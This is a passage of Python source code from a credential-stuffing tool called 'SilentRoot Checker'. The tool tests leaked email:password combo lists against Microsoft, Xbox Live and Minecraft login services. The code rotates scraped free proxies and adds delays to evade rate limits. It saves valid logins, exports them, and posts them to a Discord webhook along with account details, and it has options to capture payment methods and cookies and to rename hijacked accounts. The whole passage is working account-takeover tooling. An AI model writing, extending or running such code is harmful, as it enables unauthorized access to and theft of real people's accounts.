                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token, xbox_token)
            except: pass
            if hit == False: validmail(email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED + f"❌ BAD: {email}:{password}" + Style.RESET_ALL)
    finally:
        session.close()

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX + f"📬 Valid Mail: {email}:{password}" + Style.RESET_ALL)

def getproxy():
    if proxytype == "'5'": 
        # Auto scraper - force proxyless if no proxies loaded
        if len(proxylist) == 0:
            return None
        return random.choice(proxylist)
    if proxytype != "'4'": 
        if len(proxylist) == 0:
            return None
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        if len(split) < 2:
            if screen == "'2'": print(Fore.RED + f"❌ BAD FORMAT: {combo.strip()}" + Style.RESET_ALL)
            bad+=1
            cpm+=1
            checked+=1
            return
        
        email = split[0].strip()
        password = split[1].strip()
        
        if email != "" and password != "" and "@" in email:
            # Add delays to avoid rate limiting
            if proxytype == "'4'":  # Proxyless mode - need significant delays
                time.sleep(random.uniform(2, 4))  # 2-4 second delay between checks
            elif thread > 80:
                time.sleep(random.uniform(0.1, 0.3))  # Small delay for high threads
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED + f"❌ BAD FORMAT: {combo.strip()}" + Style.RESET_ALL)
            bad+=1
            cpm+=1
            checked+=1
    except Exception as e:
        if screen == "'2'": print(Fore.RED + f"❌ ERROR: {combo.strip()} - {str(e)[:50]}" + Style.RESET_ALL)
        bad+=1
        cpm+=1
        checked+=1

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.RED + Style.BRIGHT + "Invalid File." + Style.RESET_ALL)
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.CYAN + Style.BRIGHT + f"[{str(len(lines) - len(Combos))}] Dupes Removed." + Style.RESET_ALL)
                print(Fore.CYAN + Style.BRIGHT + f"[{len(Combos)}] Combos Loaded." + Style.RESET_ALL)
        except:
            print(Fore.RED + Style.BRIGHT + "Your file is probably harmed." + Style.RESET_ALL)
            time.sleep(2)
            Load()

def Proxys(retry_count=0):
    global proxylist, proxytype
    
    # If failed 3 times, switch to auto-scrape
    if retry_count >= 3:
        print(Fore.YELLOW + Style.BRIGHT + "\n⚠️  Failed to select proxy file 3 times!" + Style.RESET_ALL)
        print(Fore.CYAN + Style.BRIGHT + "🔄 Automatically switching to Auto Scraper mode..." + Style.RESET_ALL)
        time.sleep(2)
        proxytype = "'5'"  # Switch to auto scraper
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
        return
    
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.RED + Style.BRIGHT + f"Invalid File. (Attempt {retry_count + 1}/3)" + Style.RESET_ALL)
        time.sleep(2)
        Proxys(retry_count + 1)
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.CYAN + Style.BRIGHT + f"Loaded [{len(proxylist)}] lines." + Style.RESET_ALL)
            time.sleep(2)
        except Exception:
            print(Fore.RED + Style.BRIGHT + "Your file is probably harmed." + Style.RESET_ALL)
            time.sleep(2)
            Proxys()

def banproxyload(retry_count=0):
    """Load separate SOCKS5 proxies for ban checking  """
    global banproxies
    
    # If failed even once, switch to auto-scrape (ban proxies are critical)
    if retry_count >= 1:
        print(Fore.YELLOW + Style.BRIGHT + "\n⚠️  Failed to select ban proxy file!" + Style.RESET_ALL)
        print(Fore.CYAN + Style.BRIGHT + "🔄 Automatically scraping SOCKS proxies for ban checking..." + Style.RESET_ALL)
        time.sleep(2)
        get_ban_proxies()
        return
    
    proxyfile = filedialog.askopenfile(mode='rb', title='Choose a SOCKS5 Proxy file for Ban Checking', filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if proxyfile is None:
        print(Fore.RED + Style.BRIGHT + "Invalid File - Switching to auto-scrape..." + Style.RESET_ALL)
        time.sleep(1)
        banproxyload(retry_count + 1)
    else:
        try:
            with open(proxyfile.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        banproxies.append(proxyline)
                    except: pass
            print(Fore.CYAN + Style.BRIGHT + f"Loaded [{len(banproxies)}] ban checking proxies." + Style.RESET_ALL)
            time.sleep(2)
        except Exception:
            print(Fore.RED + Style.BRIGHT + "Your file is probably harmed - Switching to auto-scrape..." + Style.RESET_ALL)
            time.sleep(1)
            banproxyload(retry_count + 1)

def get_ban_proxies():
    """Auto scrape SOCKS proxies specifically for ban checking"""
    global banproxies
    print(Fore.CYAN + Style.BRIGHT + "Auto-scraping SOCKS proxies for ban checking..." + Style.RESET_ALL)
    socks_proxies = []
    
    # Premium SOCKS proxy sources for ban checking
    socks_apis = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=10000&proxy_format=ipport&format=text",
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=10000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"
    ]
    
    try:
        for service in socks_apis:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    socks_proxies.extend(response.text.strip().splitlines())
            except:
                pass
        
        # Validate and filter SOCKS proxies
        def is_valid_proxy(proxy):
            try:
                if ':' not in proxy:
                    return False
                parts = proxy.split(':')
                if len(parts) != 2:
                    return False
                ip, port = parts
                # Basic IP validation
                ip_parts = ip.split('.')
                if len(ip_parts) != 4:
                    return False
                for part in ip_parts:
                    if not part.isdigit() or not 0 <= int(part) <= 255:
                        return False
                # Port validation
                if not port.isdigit() or not 1 <= int(port) <= 65535:
                    return False
                return True
            except:
                return False
        
        # Filter and deduplicate
        valid_socks = list(set([p.strip() for p in socks_proxies if is_valid_proxy(p.strip())]))
        banproxies.clear()
        banproxies.extend(valid_socks)
        
        print(Fore.GREEN + Style.BRIGHT + f"Auto-scraped {len(banproxies)} SOCKS proxies for ban checking!" + Style.RESET_ALL)
        
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"Error auto-scraping ban proxies: {str(e)}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Falling back to main proxy pool for ban checking..." + Style.RESET_ALL)

def test_proxy_speeds(proxy_list, proxy_type):
    """Optimized proxy speed testing - fast and efficient"""
    if not proxy_list or len(proxy_list) == 0:
        return proxy_list
    
    # Smart sampling based on list size
    if len(proxy_list) > 5000:
        print(Fore.YELLOW + f"📊 Large {proxy_type} list ({len(proxy_list)}), using smart sampling..." + Style.RESET_ALL)
        # Take every 100th proxy for massive lists
        sample_proxies = proxy_list[::100][:10]
    elif len(proxy_list) > 1000:
        print(Fore.YELLOW + f"📊 Medium {proxy_type} list ({len(proxy_list)}), testing sample..." + Style.RESET_ALL)
        # Take every 50th proxy for large lists
        sample_proxies = proxy_list[::50][:15]
    else:
        print(Fore.YELLOW + f"📊 Testing {min(10, len(proxy_list))} {proxy_type} proxies..." + Style.RESET_ALL)
        # Test up to 10 for smaller lists
        sample_proxies = proxy_list[:10]
    
    working_proxies = []
    
    def quick_test_proxy(proxy):
        """Quick proxy test with very short timeout"""
        try:
            if proxy_type == "HTTP":
                proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                test_url = 'http://httpbin.org/ip'
            else:  # SOCKS4/SOCKS5
                if proxy_type == "SOCKS4":
                    proxy_dict = {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
                else:
                    proxy_dict = {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
                test_url = 'http://httpbin.org/ip'
            
            start_time = time.time()
            response = requests.get(test_url, proxies=proxy_dict, timeout=2)  # Very short timeout
            speed = time.time() - start_time
            
            if response.status_code == 200:
                return (proxy, speed)
        except:
            pass
        return None
    
    # Test proxies with progress indication
    tested_count = 0
    for proxy in sample_proxies:
        tested_count += 1
        if tested_count % 5 == 0:
            print(Fore.CYAN + f"   Testing {proxy_type} proxy {tested_count}/{len(sample_proxies)}..." + Style.RESET_ALL)
        
        result = quick_test_proxy(proxy)
        if result:
            working_proxies.append(result)
        
        # Stop early if we have enough working proxies
        if len(working_proxies) >= 5:
            break
    
    if working_proxies:
        # Sort by speed and get the fastest ones
        working_proxies.sort(key=lambda x: x[1])
        fast_proxies = [proxy[0] for proxy in working_proxies]
        
        print(Fore.GREEN + f"✅ Found {len(fast_proxies)} working {proxy_type} proxies" + Style.RESET_ALL)
        
        # Add more untested proxies to reach a good number
        if len(fast_proxies) < 50:
            remaining_needed = 50 - len(fast_proxies)
            # Add proxies that weren't tested
            untested_start = len(sample_proxies)
            if untested_start < len(proxy_list):
                additional_proxies = proxy_list[untested_start:untested_start + remaining_needed]
                fast_proxies.extend(additional_proxies)
        
        return fast_proxies
    else:
        print(Fore.YELLOW + f"⚠️  No working {proxy_type} proxies found in sample, using first 50..." + Style.RESET_ALL)
        return proxy_list[:50]  # Return first 50 if none work

def get_proxies():
    global proxylist, proxytype
    print(Fore.CYAN + Style.BRIGHT + "Scraping proxies, please wait..." + Style.RESET_ALL)
    http = []
    socks4 = []
    socks5 = []
    
    # Enhanced HTTP Proxy APIs - Multiple high-quality sources
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=10000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"
    ]
    
    # Enhanced SOCKS4 Proxy APIs - More reliable sources
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=10000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt"
    ]
    
    # Enhanced SOCKS5 Proxy APIs - Premium sources for ban checking
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=10000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt"
    ]
    
    try:
        # Enhanced parallel scraping with better error handling
        def scrape_source(url, proxy_type):
            try:
                response = requests.get(url, timeout=8, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                if response.status_code == 200 and response.text.strip():
                    proxies = [p.strip() for p in response.text.strip().splitlines() if p.strip()]
                    print(Fore.YELLOW + f"✓ {proxy_type}: {len(proxies)} from {url.split('/')[-1]}" + Style.RESET_ALL)
                    return proxies
            except Exception as e:
                print(Fore.RED + f"✗ {proxy_type}: Failed {url.split('/')[-1]} - {str(e)[:30]}" + Style.RESET_ALL)
            return []
        
        # Scrape HTTP proxies with progress
        print(Fore.CYAN + "Scraping HTTP proxies..." + Style.RESET_ALL)
        for service in api_http:
            http.extend(scrape_source(service, "HTTP"))
        
        # Scrape SOCKS4 proxies with progress
        print(Fore.CYAN + "Scraping SOCKS4 proxies..." + Style.RESET_ALL)
        for service in api_socks4:
            socks4.extend(scrape_source(service, "SOCKS4"))
        
        # Scrape SOCKS5 proxies with progress
        print(Fore.CYAN + "Scraping SOCKS5 proxies..." + Style.RESET_ALL)
        for service in api_socks5:
            socks5.extend(scrape_source(service, "SOCKS5"))
        
        # Remove duplicates and filter valid proxies with better validation
        def is_valid_proxy(proxy):
            try:
                if ':' not in proxy:
                    return False
                parts = proxy.split(':')
                if len(parts) != 2:
                    return False
                ip, port = parts
                # Basic IP validation
                ip_parts = ip.split('.')
                if len(ip_parts) != 4:
                    return False
                for part in ip_parts:
                    if not part.isdigit() or not 0 <= int(part) <= 255:
                        return False
                # Port validation
                if not port.isdigit() or not 1 <= int(port) <= 65535:
                    return False
                return True
            except:
                return False
        
        http = list(set([p.strip() for p in http if is_valid_proxy(p.strip())]))
        socks4 = list(set([p.strip() for p in socks4 if is_valid_proxy(p.strip())]))
        socks5 = list(set([p.strip() for p in socks5 if is_valid_proxy(p.strip())]))
        
        print(Fore.YELLOW + f"Filtered proxies - HTTP: {len(http)}, SOCKS4: {len(socks4)}, SOCKS5: {len(socks5)}" + Style.RESET_ALL)
        
        # Proxy speed testing if enabled
        if config.get('proxyspeedtest'):
            print(Fore.CYAN + "Testing proxy speeds..." + Style.RESET_ALL)
            http = test_proxy_speeds(http, "HTTP")
            socks4 = test_proxy_speeds(socks4, "SOCKS4") 
            socks5 = test_proxy_speeds(socks5, "SOCKS5")
        
        # Select proxy type based on user choice and store as dictionaries 
        proxylist.clear()
        if proxytype == "'1'":  # HTTP
            for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
        elif proxytype == "'2'":  # SOCKS4
            for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy})
        elif proxytype == "'3'":  # SOCKS5
            for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy})
        else:  # Auto scraper - mix all types as dictionaries
            for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
            for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy, 'https': 'socks4://'+proxy})
            for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy})
        
        if len(proxylist) > 0:
            print(Fore.GREEN + Style.BRIGHT + f"Successfully scraped {len(proxylist)} proxies!" + Style.RESET_ALL)
            if screen == "'2'": print(Fore.LIGHTBLUE_EX + f'Scraped [{len(proxylist)}] proxies')
        else:
            print(Fore.RED + Style.BRIGHT + "⚠️  No valid proxies found! Switching to proxyless mode..." + Style.RESET_ALL)
            proxytype = "'4'"  # Switch to proxyless
            return
        
        # Analytics tracking
        if config.get('trackstats'):
            save_analytics_data()
        
    except Exception as e:
        print(Fore.RED + Style.BRIGHT + f"Error scraping proxies: {str(e)}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Continuing without proxies..." + Style.RESET_ALL)
        time.sleep(2)

def export_results():
    """Export results to CSV format"""
    if not config.get('exportresults'):
        return
    
    try:
        import csv
        results_file = f'results/{fname}/export.csv'
        
        # Read all result files and compile data
        result_data = []
        
        # Add hits
        try:
            with open(f'results/{fname}/Hits.txt', 'r') as f:
                for line in f:
                    if ':' in line:
                        email, password = line.strip().split(':', 1)
                        result_data.append(['Hit', email, password, '', ''])
        except: pass
        
        # Add 2FA
        try:
            with open(f'results/{fname}/2fa.txt', 'r') as f:
                for line in f:
                    if ':' in line:
                        email, password = line.strip().split(':', 1)
                        result_data.append(['2FA', email, password, '', ''])
        except: pass
        
        # Write CSV
        with open(results_file, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(['Type', 'Email', 'Password', 'Extra1', 'Extra2'])
            writer.writerows(result_data)
            
        print(Fore.GREEN + f"✅ Results exported to {results_file}" + Style.RESET_ALL)
        
    except Exception as e:
        pass

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    # Default configuration values
    default_config = {
        'Settings': {
            'Webhook': 'paste your discord webhook here',
            'WebhookBanned': 'paste banned accounts webhook (optional)',
            'WebhookUnbanned': 'paste unbanned accounts webhook (optional)',
            'Embed': True,
            'Max Retries': 5,
            'Proxyless Ban Check': False,
            'Use Different Proxies To Ban Check': False,
            'WebhookMessage': '''@everyone SilentRoot HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Hypixel: <hypixel>
Hypixel Level: <level>
First Hypixel Login: <firstlogin>
Last Hypixel Login: <lastlogin>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Hypixel Skyblock Coins: <skyblockcoins>
Hypixel Bedwars Stars: <bedwarsstars>
Banned: <banned>
Can Change Name: <namechange>
Last Name Change: <lastchanged>
DonutSMP Status: <donutstatus>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5,
            'Proxy Speed Test': True,
            'Continuous Refresh': True,
            'Max Proxy Sources': 20
        },
        'Auto': {
            'Set Name': False,
            'Custom Name': 'SilentRoot',
            'Set Skin': False,
            'Skin URL': 'https://ik.imagekit.io/3xnpqon35/silentroot_skin.png',
            'Skin Variant': 'classic'
        },
        'Analytics': {
            'Track Success Rates': True,
            'Save Performance Logs': True,
            'Export Results': True
        },
        'Captures': {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'DonutSMP Check': True,
            'Payment Methods': True,
            'Save Cookies': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    
    # Dynamic config updating   - adds missing sections/options
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    
    # Save updated config if changes were made
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
        print(Fore.YELLOW + Style.BRIGHT + "Config updated with new options!" + Style.RESET_ALL)
    # settings
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('webhook_banned', str(read_config['Settings'].get('WebhookBanned', '')))
    config.set('webhook_unbanned', str(read_config['Settings'].get('WebhookUnbanned', '')))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    # capture
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('donutcheck', str_to_bool(read_config['Captures']['DonutSMP Check']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment Methods']))
    config.set('cookies', str_to_bool(read_config['Captures']['Save Cookies']))
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    config.set('proxyspeedtest', str_to_bool(read_config['Scraper']['Proxy Speed Test']))
    config.set('continuousrefresh', str_to_bool(read_config['Scraper']['Continuous Refresh']))
    config.set('differentproxy', str_to_bool(read_config['Settings']['Use Different Proxies To Ban Check']))
    
    # Auto customization settings
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('customname', str(read_config['Auto']['Custom Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skinurl', str(read_config['Auto']['Skin URL']))
    config.set('skinvariant', str(read_config['Auto']['Skin Variant']))
    
    # Analytics settings
    config.set('trackstats', str_to_bool(read_config['Analytics']['Track Success Rates']))
    config.set('savelogs', str_to_bool(read_config['Analytics']['Save Performance Logs']))
    config.set('exportresults', str_to_bool(read_config['Analytics']['Export Results']))

def cuiscreen():
    """Compact UI Screen from backup version"""
    global cpm, cpm1, start_time
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # 100% Accurate CPM calculation with real-time precision
    current_time = time.time()
    
    # Initialize tracking variables if first run
    if not hasattr(cuiscreen, 'start_time'):
        cuiscreen.start_time = start_time
        cuiscreen.start_checked = 0
        cuiscreen.last_update = current_time
        cuiscreen.last_checked = checked
        cuiscreen.cpm_samples = []
    
    # Calculate overall CPM (most accurate for long runs)
    total_elapsed = current_time - cuiscreen.start_time
    total_checks = checked - cuiscreen.start_checked
    overall_cpm = (total_checks / (total_elapsed / 60)) if total_elapsed > 0 else 0
    
    # Calculate recent CPM (for responsiveness)
    time_diff = current_time - cuiscreen.last_update
    if time_diff >= 0.5:  # Update every 0.5 seconds for better accuracy
        checks_diff = checked - cuiscreen.last_checked
        recent_cpm = (checks_diff / (time_diff / 60)) if time_diff > 0 else 0
        
        # Store recent samples for smoothing
        cuiscreen.cpm_samples.append(recent_cpm)
        if len(cuiscreen.cpm_samples) > 20:  # Keep last 20 samples (10 seconds)
            cuiscreen.cpm_samples.pop(0)
        
        # Use weighted average: 70% overall CPM + 30% recent average
        recent_avg = sum(cuiscreen.cpm_samples) / len(cuiscreen.cpm_samples) if cuiscreen.cpm_samples else 0
        cpm1 = (overall_cpm * 0.7) + (recent_avg * 0.3) if total_elapsed > 10 else recent_avg
        
        cuiscreen.last_update = current_time
        cuiscreen.last_checked = checked
    else:
        cpm1 = getattr(cuiscreen, 'last_cpm', overall_cpm)
    
    cuiscreen.last_cpm = cpm1
    
    # Calculate statistics with maximum precision
    progress = (checked / len(Combos) * 100.0) if len(Combos) > 0 else 0.0
    success_rate = (hits / checked * 100.0) if checked > 0 else 0.0
    
    # Enhanced ETA calculation
    elapsed_time = current_time - start_time if 'start_time' in globals() else 0
    remaining = len(Combos) - checked
    
    if cpm1 > 0.1 and remaining > 0:  # Only calculate if CPM is meaningful
        # Method 1: Based on current CPM
        eta_seconds_cpm = (remaining / cpm1) * 60.0
        
        # Method 2: Based on overall rate (more stable for long runs)
        if elapsed_time > 60:  # Only use after 1 minute for accuracy
            overall_rate = checked / (elapsed_time / 60.0)
            eta_seconds_overall = (remaining / overall_rate) * 60.0 if overall_rate > 0 else eta_seconds_cpm
            # Weighted average: 60% current CPM + 40% overall rate
            eta_seconds = (eta_seconds_cpm * 0.6) + (eta_seconds_overall * 0.4)
        else:
            eta_seconds = eta_seconds_cpm
        
        # Format ETA with proper rounding
        eta_hours = int(eta_seconds // 3600)
        eta_minutes = int((eta_seconds % 3600) // 60)
        eta_secs = int(eta_seconds % 60)
        eta_display = f"{eta_hours:02d}:{eta_minutes:02d}:{eta_secs:02d}" if eta_hours > 0 else f"{eta_minutes:02d}:{eta_secs:02d}"
    else:
        eta_display = "Calculating..." if checked < 10 else "∞"
    
    # Format elapsed time with precision
    elapsed_hours = int(elapsed_time // 3600)
    elapsed_minutes = int((elapsed_time % 3600) // 60)
    elapsed_secs = int(elapsed_time % 60)
    elapsed_display = f"{elapsed_hours:02d}:{elapsed_minutes:02d}:{elapsed_secs:02d}" if elapsed_hours > 0 else f"{elapsed_minutes:02d}:{elapsed_secs:02d}"
    
    # Create ultra-precise progress bar with sub-character precision
    bar_length = 60
    filled_length = int(bar_length * progress / 100.0)
    partial_fill = (bar_length * progress / 100.0) - filled_length
    
    # Use different characters for partial fill for ultra precision
    if partial_fill >= 0.75:
        partial_char = '▉'
    elif partial_fill >= 0.5:
        partial_char = '▌'
    elif partial_fill >= 0.25:
        partial_char = '▎'
    else:
        partial_char = ''
    
    bar = '█' * filled_length + partial_char + '░' * (bar_length - filled_length - (1 if partial_char else 0))
    
    # Modern UI without emojis
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════════╗")
    print(f"║{Fore.WHITE}{Style.BRIGHT}                            SILENTROOT CHECKER                                    {Fore.WHITE}║")
    print(f"╠══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.WHITE}Progress: {Fore.GREEN}{progress:6.2f}%{Fore.WHITE} │ {Fore.YELLOW}CPM: {cpm1:6.1f}{Fore.WHITE} │ {Fore.MAGENTA}ETA: {eta_display:>8}{Fore.WHITE} │ {Fore.CYAN}Elapsed: {elapsed_display:>8} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.WHITE}Checked: {Fore.BLUE}{checked:>6}{Fore.WHITE}/{Fore.BLUE}{len(Combos):<6}{Fore.WHITE} │ {Fore.GREEN}Success Rate: {success_rate:5.1f}%{Fore.WHITE} │ {Fore.RED}Threads: {thread:>3} {Fore.CYAN}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.WHITE}{bar}                     {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════════╣{Style.RESET_ALL}")
    
    # Results section - each stat on its own line
    print(f"{Fore.CYAN}║ {Fore.GREEN}HITS:        {Fore.WHITE}{hits:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.RED}BAD:         {Fore.WHITE}{bad:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.YELLOW}SFA:         {Fore.WHITE}{sfa:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.CYAN}MFA:         {Fore.WHITE}{mfa:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.MAGENTA}2FA:         {Fore.WHITE}{twofa:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTRED_EX}ERR:         {Fore.WHITE}{errors:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.BLUE}XGP:         {Fore.WHITE}{xgp:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║ {Fore.LIGHTBLUE_EX}XGPU:        {Fore.WHITE}{xgpu:>6}                                                              {Fore.CYAN}║{Style.RESET_ALL}")
